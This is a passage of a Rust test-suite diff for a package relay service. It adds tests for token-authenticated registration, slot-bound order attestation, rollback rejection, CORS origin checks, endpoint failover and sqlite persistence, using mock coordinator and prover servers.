             .unwrap();
         assert_eq!(response.status(), StatusCode::OK);
         assert!(path.exists());
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[tokio::test]
+    async fn package_order_attestation_binds_exact_slot() {
+        let path = temp_store_path("attest-order");
+        let mut state = test_state(path.clone());
+        state.config.package_registration_token = Some(Arc::new("package-token".into()));
+        let router = app(state);
+        let package = test_package("http://coordinator".into(), "http://prover".into());
+
+        let response = router
+            .clone()
+            .oneshot(
+                axum::http::Request::builder()
+                    .method("POST")
+                    .uri("/packages")
+                    .header("content-type", "application/json")
+                    .header(AUTHORIZATION, "Bearer package-token")
+                    .body(axum::body::Body::from(
+                        serde_json::to_vec(&package).unwrap(),
+                    ))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(response.status(), StatusCode::OK);
+
+        let slot = &package.slots[0];
+        let response = router
+            .clone()
+            .oneshot(
+                axum::http::Request::builder()
+                    .method("POST")
+                    .uri("/packages/pkg-1/attest-order")
+                    .header("content-type", "application/json")
+                    .header(AUTHORIZATION, "Bearer package-token")
+                    .body(axum::body::Body::from(
+                        serde_json::json!({
+                            "package_commitment": package.package_commitment.clone(),
+                            "order_commitment": slot.order_commitment.clone(),
+                            "pair": slot.pair.clone(),
+                            "batch_id": slot.batch_id.clone(),
+                            "epoch_id": slot.epoch_id,
+                        })
+                        .to_string(),
+                    ))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(response.status(), StatusCode::OK);
+        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
+            .await
+            .unwrap();
+        let json = serde_json::from_slice::<serde_json::Value>(&body).unwrap();
+        assert_eq!(json["package_id"], "pkg-1");
+        assert_eq!(json["order_commitment"], slot.order_commitment);
+
+        let response = router
+            .oneshot(
+                axum::http::Request::builder()
+                    .method("POST")
+                    .uri("/packages/pkg-1/attest-order")
+                    .header("content-type", "application/json")
+                    .header(AUTHORIZATION, "Bearer package-token")
+                    .body(axum::body::Body::from(
+                        serde_json::json!({
+                            "package_commitment": package.package_commitment.clone(),
+                            "order_commitment": "0xbad",
+                            "pair": slot.pair.clone(),
+                            "batch_id": slot.batch_id.clone(),
+                            "epoch_id": slot.epoch_id,
+                        })
+                        .to_string(),
+                    ))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(response.status(), StatusCode::NOT_FOUND);
         let _ = std::fs::remove_file(path);
     }
 
@@ -3412,7 +4914,103 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn strict_delete_removes_signed_package_without_bearer_token() {
+    async fn register_package_rejects_stale_refresh_rollback() {
+        let path = temp_sqlite_store_path("refresh-rollback");
+        let state = test_state(path.clone());
+        let mut original = test_package("http://coordinator".into(), "http://prover".into());
+        original.parent_cancel_authority = Some("0xparent".into());
+        refresh_test_package_commitment(&mut original);
+        let mut refreshed = original.clone();
+        refreshed.created_at_unix_ms = original.created_at_unix_ms + 1;
+        refreshed.end_epoch = 43;
+        refreshed.slot_count = 2;
+        let mut second_slot = refreshed.slots[0].clone();
+        second_slot.slot_id = "pkg-1:2".into();
+        second_slot.batch_id = "STRK-USDC-43".into();
+        second_slot.epoch_id = 43;
+        second_slot.parent_child_index = 2;
+        second_slot.order_commitment = "0x456".into();
+        refreshed.slots.push(second_slot);
+        refresh_test_package_commitment(&mut refreshed);
+        let router = app(state);
+
+        for package in [&original, &refreshed] {
+            let response = router
+                .clone()
+                .oneshot(
+                    axum::http::Request::builder()
+                        .method("POST")
+                        .uri("/packages")
+                        .header("content-type", "application/json")
+                        .body(axum::body::Body::from(serde_json::to_vec(package).unwrap()))
+                        .unwrap(),
+                )
+                .await
+                .unwrap();
+            assert_eq!(response.status(), StatusCode::OK);
+        }
+
+        let response = router
+            .oneshot(
+                axum::http::Request::builder()
+                    .method("POST")
+                    .uri("/packages")
+                    .header("content-type", "application/json")
+                    .body(axum::body::Body::from(
+                        serde_json::to_vec(&original).unwrap(),
+                    ))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(response.status(), StatusCode::CONFLICT);
+
+        let loaded = load_sqlite_store(&path).await.unwrap();
+        let stored = loaded.packages.get("pkg-1").unwrap();
+        assert_eq!(
+            stored.package.package_commitment,
+            refreshed.package_commitment
+        );
+        cleanup_sqlite_store(&path);
+    }
+
+    #[tokio::test]
+    async fn package_registration_signature_is_not_persisted() {
+        let path = temp_sqlite_store_path("strip-package-auth");
+        let mut package = test_package("http://coordinator".into(), "http://prover".into());
+        authorize_package(&mut package);
+        let state = test_state(path.clone());
+
+        let response = app(state)
+            .oneshot(
+                axum::http::Request::builder()
+                    .method("POST")
+                    .uri("/packages")
+                    .header("content-type", "application/json")
+                    .body(axum::body::Body::from(
+                        serde_json::to_vec(&package).unwrap(),
+                    ))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(response.status(), StatusCode::OK);
+
+        let loaded = load_sqlite_store(&path).await.unwrap();
+        assert!(
+            loaded
+                .packages
+                .get("pkg-1")
+                .unwrap()
+                .package
+                .relay_authorization
+                .is_none()
+        );
+        cleanup_sqlite_store(&path);
+    }
+
+    #[tokio::test]
+    async fn strict_delete_accepts_package_signature_without_bearer_token() {
         let path = temp_sqlite_store_path("strict-signed-delete");
         let mut state = test_state(path.clone());
         state.config.strict_mode = true;
@@ -3511,6 +5109,82 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn cors_preflight_allows_browser_package_delete() {
+        let path = temp_sqlite_store_path("cors-delete");
+        let state = test_state(path.clone());
+        let router = app(state);
+        let response = router
+            .oneshot(
+                axum::http::Request::builder()
+                    .method("OPTIONS")
+                    .uri("/packages/pkg-1")
+                    .header("origin", "https://app.example")
+                    .header("access-control-request-method", "DELETE")
+                    .body(axum::body::Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert!(response.status().is_success());
+        let methods = response
+            .headers()
+            .get("access-control-allow-methods")
+            .and_then(|value| value.to_str().ok())
+            .unwrap_or_default();
+        assert!(methods.contains("DELETE"));
+        cleanup_sqlite_store(&path);
+    }
+
+    #[tokio::test]
+    async fn cors_preflight_does_not_allow_disallowed_origin() {
+        let path = temp_sqlite_store_path("cors-deny");
+        let mut state = test_state(path.clone());
+        state.config.allowed_origins = vec![HeaderValue::from_static("https://app.zylith.fi")];
+        let router = app(state);
+        let response = router
+            .oneshot(
+                axum::http::Request::builder()
+                    .method("OPTIONS")
+                    .uri("/packages/pkg-1")
+                    .header("origin", "https://evil.example")
+                    .header("access-control-request-method", "DELETE")
+                    .body(axum::body::Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert!(
+            response
+                .headers()
+                .get("access-control-allow-origin")
+                .is_none()
+        );
+        cleanup_sqlite_store(&path);
+    }
+
+    #[tokio::test]
+    async fn missing_package_status_and_results_do_not_reveal_existence() {
+        let path = temp_sqlite_store_path("missing-oracle");
+        let state = test_state(path.clone());
+        let router = app(state);
+        for uri in ["/packages/missing", "/packages/missing/results"] {
+            let response = router
+                .clone()
+                .oneshot(
+                    axum::http::Request::builder()
+                        .method("GET")
+                        .uri(uri)
+                        .body(axum::body::Body::empty())
+                        .unwrap(),
+                )
+                .await
+                .unwrap();
+            assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
+        }
+        cleanup_sqlite_store(&path);
+    }
+
+    #[tokio::test]
     async fn process_due_slot_posts_through_prover_and_coordinator() {
         let (coordinator_url, coordinator_shutdown) = spawn_mock_coordinator().await;
         let (prover_url, prover_shutdown) = spawn_mock_prover().await;
@@ -3544,6 +5218,41 @@ mod tests {
         );
         let _ = coordinator_shutdown.send(());
         let _ = prover_shutdown.send(());
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[tokio::test]
+    async fn submit_slot_uses_configured_endpoint_failover() {
+        let (bad_coordinator_url, bad_coordinator_shutdown) = spawn_failing_mock().await;
+        let (good_coordinator_url, good_coordinator_shutdown) = spawn_mock_coordinator().await;
+        let (bad_prover_url, bad_prover_shutdown) = spawn_failing_mock().await;
+        let (good_prover_url, good_prover_shutdown) = spawn_mock_prover().await;
+        let path = temp_store_path("submit-failover");
+        let mut state = test_state(path.clone());
+        state.config.default_coordinator_url = Some(bad_coordinator_url);
+        state
+            .config
+            .default_coordinator_failover_urls
+            .push(good_coordinator_url);
+        state.config.default_prover_url = Some(bad_prover_url);
+        state
+            .config
+            .default_prover_failover_urls
+            .push(good_prover_url);
+        let package = test_package(
+            "http://ignored-coordinator".into(),
+            "http://ignored-prover".into(),
+        );
+
+        let accepted = submit_slot(&state, &package, &package.slots[0])
+            .await
+            .expect("failover submission");
+
+        assert_eq!(accepted.batch_id, "STRK-USDC-42");
+        let _ = bad_coordinator_shutdown.send(());
+        let _ = good_coordinator_shutdown.send(());
+        let _ = bad_prover_shutdown.send(());
+        let _ = good_prover_shutdown.send(());
         let _ = std::fs::remove_file(path);
     }
 
@@ -3599,7 +5308,7 @@ mod tests {
         let mut statuses = BTreeMap::new();
         statuses.insert(
             "STRK-USDC-42".into(),
-            json!({ "state": "confirmed-onchain", "matched_order_count": 2 }),
+            json!({ "state": "confirmed-onchain", "reuse_state": "matched" }),
         );
         let (prover_url, prover_shutdown) = spawn_mock_prover_with_statuses(statuses).await;
         let path = temp_store_path("reuse-refresh");
@@ -3631,6 +5340,50 @@ mod tests {
         let results = process_due_slots_once(&state).await;
         assert_eq!(results.len(), 1);
         assert_eq!(results[0].status, RelaySlotStatus::AwaitingWalletRefresh);
+        let _ = coordinator_shutdown.send(());
+        let _ = prover_shutdown.send(());
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[tokio::test]
+    async fn process_due_slot_blocks_reused_funding_after_prior_proof_failure() {
+        let (coordinator_url, coordinator_shutdown) =
+            spawn_mock_coordinator_for_batch("STRK-USDC-43", 43).await;
+        let mut statuses = BTreeMap::new();
+        statuses.insert(
+            "STRK-USDC-42".into(),
+            json!({ "state": "proof-failed", "failure": "temporary prover failure" }),
+        );
+        let (prover_url, prover_shutdown) = spawn_mock_prover_with_statuses(statuses).await;
+        let path = temp_store_path("reuse-proof-failed");
+        let state = test_state(path.clone());
+        let mut package = two_slot_test_package(coordinator_url, prover_url, true);
+        package.relay_mode = Some(RelayMode::SelfRelay);
+        refresh_test_package_commitment(&mut package);
+        {
+            let mut store = state.store.write().await;
+            let now = now_unix_ms();
+            let first_result = slot_result(&package.slots[0], RelaySlotStatus::Submitted, None);
+            store.packages.insert(
+                package.package_id.clone(),
+                StoredPackage {
+                    package: package.clone(),
+                    registered_at_unix_ms: now,
+                    updated_at_unix_ms: now,
+                    results: BTreeMap::from([(
+                        package.slots[0].slot_id.clone(),
+                        StoredSlotResult {
+                            result: first_result,
+                            attempts: 1,
+                            last_attempt_unix_ms: now,
+                        },
+                    )]),
+                },
+            );
+        }
+        let results = process_due_slots_once(&state).await;
+        assert_eq!(results.len(), 1);
+        assert_eq!(results[0].status, RelaySlotStatus::AwaitingSettlement);
         let _ = coordinator_shutdown.send(());
         let _ = prover_shutdown.send(());
         let _ = std::fs::remove_file(path);
@@ -3811,6 +5564,49 @@ mod tests {
         cleanup_sqlite_store(&path);
     }
 
+    #[tokio::test]
+    async fn sqlite_store_upsert_does_not_delete_packages_absent_from_snapshot() {
+        let path = temp_sqlite_store_path("sqlite-no-snapshot-delete");
+        let mut first = test_package("http://coordinator".into(), "http://prover".into());
+        first.package_id = "pkg-a".into();
+        first.slots[0].slot_id = "pkg-a:1".into();
+        refresh_test_package_commitment(&mut first);
+        let mut second = test_package("http://coordinator".into(), "http://prover".into());
+        second.package_id = "pkg-b".into();
+        second.slots[0].slot_id = "pkg-b:1".into();
+        refresh_test_package_commitment(&mut second);
+
+        let now = now_unix_ms();
+        let mut first_store = RelayStore::default();
+        first_store.packages.insert(
+            first.package_id.clone(),
+            StoredPackage {
+                package: first.clone(),
+                registered_at_unix_ms: now,
+                updated_at_unix_ms: now,
+                results: BTreeMap::new(),
+            },
+        );
+        persist_sqlite_store(&path, first_store).await.unwrap();
+
+        let mut second_store = RelayStore::default();
+        second_store.packages.insert(
+            second.package_id.clone(),
+            StoredPackage {
+                package: second.clone(),
+                registered_at_unix_ms: now,
+                updated_at_unix_ms: now,
+                results: BTreeMap::new(),
+            },
+        );
+        persist_sqlite_store(&path, second_store).await.unwrap();
+
+        let loaded = load_sqlite_store(&path).await.unwrap();
+        assert!(loaded.packages.contains_key("pkg-a"));
+        assert!(loaded.packages.contains_key("pkg-b"));
+        cleanup_sqlite_store(&path);
+    }
+
     async fn spawn_mock_coordinator() -> (String, oneshot::Sender<()>) {
         spawn_mock_coordinator_for_batch("STRK-USDC-42", 42).await
     }
@@ -3835,13 +5631,17 @@ mod tests {
             )
             .route(
                 "/api/orders",
-                post(move |Json(_body): Json<Value>| async move {
+                post(move |Json(body): Json<Value>| async move {
                     Json(json!({
-                        "batch_id": batch_id,
-                        "order_commitment": "0x123",
+                        "batch_id": body.get("batch_id").cloned().unwrap_or_else(|| json!(batch_id)),
+                        "order_commitment": body.get("order_commitment").cloned().unwrap_or_else(|| json!("0x123")),
                         "accepted_at_unix_ms": now_unix_ms()
                     }))
                 }),
+            )
+            .route(
+                "/api/renewal/cancel-markers/{_marker}",
+                get(|| async move { Json(json!({ "recorded": false })) }),
             );
         spawn_mock(app).await
     }
@@ -3860,12 +5660,20 @@ mod tests {
                 post(|Json(body): Json<Value>| async move {
                     Json(json!({
                         "receipt": {
+                            "order_commitment": body.get("renewal_slot_order_commitment").cloned().unwrap_or(Value::Null),
+                            "pair_id": body.get("renewal_slot_pair").cloned().unwrap_or(Value::Null),
+                            "batch_id": body.get("renewal_slot_batch_id").cloned().unwrap_or(Value::Null),
+                            "epoch_id": body.get("renewal_slot_epoch_id").cloned().unwrap_or(Value::Null),
                             "payload_commitment": "0xabc",
                             "relay_mode": body.get("renewal_relay_mode").cloned().unwrap_or(Value::Null),
                             "renewal_package_id": body.get("renewal_package_id").cloned().unwrap_or(Value::Null),
                             "renewal_package_commitment": body.get("renewal_package_commitment").cloned().unwrap_or(Value::Null)
                         },
-                        "coordinator_submission": { "order_bundle": { "opaque": true } }
+                        "coordinator_submission": {
+                            "batch_id": body.get("renewal_slot_batch_id").cloned().unwrap_or(Value::Null),
+                            "order_commitment": body.get("renewal_slot_order_commitment").cloned().unwrap_or(Value::Null),
+                            "order_bundle": { "opaque": true }
+                        }
                     }))
                 }),
             )
@@ -3885,6 +5693,10 @@ mod tests {
                 }),
             );
         spawn_mock(app).await
+    }
+
+    async fn spawn_failing_mock() -> (String, oneshot::Sender<()>) {
+        spawn_mock(Router::new().fallback(|| async { StatusCode::SERVICE_UNAVAILABLE })).await
     }
 
     async fn spawn_mock(app: Router) -> (String, oneshot::Sender<()>) {
